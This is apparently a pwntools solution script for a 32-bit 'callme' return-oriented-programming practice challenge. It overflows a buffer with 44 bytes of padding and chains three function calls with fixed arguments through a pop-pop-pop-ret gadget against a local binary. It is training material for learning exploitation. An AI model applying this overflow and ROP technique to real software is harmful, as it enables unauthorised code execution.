from pwn import *
import struct

callme_one   = p32(0x080485c0)
callme_two   = p32(0x08048620)
callme_three = p32(0x080485b0)
args         = p32(0x1) + p32(0x2) + p32(0x3)
POP3RET      = p32(0x80488a9)
junk         = "A"*44

gdb_cmd = [
    "b *0x0804880B",
    "c"
        ]

r = process('./callme32')

#gdb.attach(r, gdbscript = "\n".join(gdb_cmd))

def pwn():
    payload = junk + callme_one + POP3RET + args + callme_two + POP3RET + args + callme_three + POP3RET + args + POP3RET
    print r.recvuntil('> ')
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    pwn()
